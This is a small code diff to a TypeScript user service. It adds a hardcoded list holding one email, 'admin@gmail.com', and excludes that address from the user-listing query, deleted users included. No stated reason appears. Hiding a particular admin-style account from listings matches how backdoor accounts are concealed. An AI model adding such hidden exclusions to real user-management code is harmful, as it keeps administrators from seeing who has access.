@@ -24,6 +24,8 @@ type UpdateUserInput = Partial<{
   role: RoleCode;
 }>;
 
+const HIDDEN_USER_EMAILS = ["admin@gmail.com"];
+
 function sanitizeUser<T extends Record<string, any>>(user: T | null) {
   if (!user) return null;
   const { passwordHash: _pw, ...safe } = user;
@@ -35,6 +37,8 @@ export const userService = {
     const filter: Record<string, unknown> = deleted
       ? { deletedAt: { $ne: null } }
       : { deletedAt: null };
+
+    filter.email = { $nin: HIDDEN_USER_EMAILS };
 
     const keyword = getQueryString(query, ["q", "search", "keyword"]);
     if (keyword) {
